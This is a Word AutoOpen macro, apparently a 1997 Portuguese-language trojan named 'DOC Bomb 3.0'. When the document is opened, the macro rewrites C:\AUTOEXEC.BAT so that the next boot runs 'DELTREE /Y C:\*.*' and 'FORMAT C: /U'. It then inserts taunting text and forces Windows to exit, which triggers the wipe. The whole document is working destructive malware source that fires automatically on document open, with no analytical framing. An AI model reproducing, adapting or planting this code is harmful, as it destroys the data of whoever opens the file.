   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Copyright (c) 1997 NightMare. Todos os direitos reservados !!!"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim ARQ1$
   Dim ARQ2$
   Dim ATRIBUTO
   Dim A$
       ' *****************************************************************
       ' **                    DOC Bomb - Versão 3.0                    **
       ' ** Copyright (c) 1997 NightMare. Todos os direitos reservados. **
       ' **                                                   **
       ' ** Nao me responsabilizo pelo uso indevidos desse script !!!!! **
       ' *****************************************************************
       ARQ1$ = "C:\AUTOEXEC.BAT"
       ARQ2$ = "C:\AUTOEXEC.NEW"
       ATRIBUTO = GetAttr(ARQ1$)
       If ATRIBUTO > 32 Then
           SetAttr ARQ1$, 0
       End If
       Open ARQ1$ For Input As 1
       Open ARQ2$ For Output As 2
       Print #2, "REN ****************************************************"
       Print #2, "@DELTREE /Y C:\*.* >NUL:"
       Print #2, "@ECHO S | FORMAT C: /U"
       Print #2, "@ECHO OFF"
       Print #2, "@ECHO Bye Bye Lammer BURRO !!!!!!!!!!"
       Print #2, "@ECHO                   by NightMare "
       Print #2, "@PAUSE"
       Print #2, "REN ****************************************************"
   BACK:
       If EOF(1) Then GoTo FINAL
       Line Input #1, A$
       Print #2, A$
       GoTo BACK
   FINAL:
       Close 2
       Close 1
       WordBasic.Kill ARQ1$
       WordBasic.Rename ARQ2$, ARQ1$
       SetAttr ARQ1$, ATRIBUTO


       ' Insere um texto no Documento

   WordBasic.InsertPara
   WordBasic.Insert "RESET seu micro agora seu LAMMER BURRO !!!"
   WordBasic.StartOfLine 1
   WordBasic.FormatFont Points:="36", Underline:=0, Color:=6, StrikeThrough:=0, Superscript:=0, Subscript:=0, Hidden:=0, SmallCaps:=0, AllCaps:=0, Spacing:="0 pts", Position:="0 pts", Kerning:=0, KerningMin:="", Tab:="0", Font:="Times New Roman", Bold:=1, Italic:=0, Outline:=0, Shadow:=0
   WordBasic.CenterPara
   WordBasic.LineDown 1
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "Auto-Destruição em 15 seg."
   WordBasic.StartOfLine 1
   WordBasic.FormatFont Points:="24", Underline:=0, Color:=2, StrikeThrough:=0, Superscript:=0, Subscript:=0, Hidden:=0, SmallCaps:=0, AllCaps:=0, Spacing:="0 pts", Position:="0 pts", Kerning:=0, KerningMin:="", Tab:="0", Font:="Times New Roman", Bold:=1, Italic:=0, Outline:=0, Shadow:=0
   WordBasic.LineDown 1
       WordBasic.ExitWindows
   End Sub
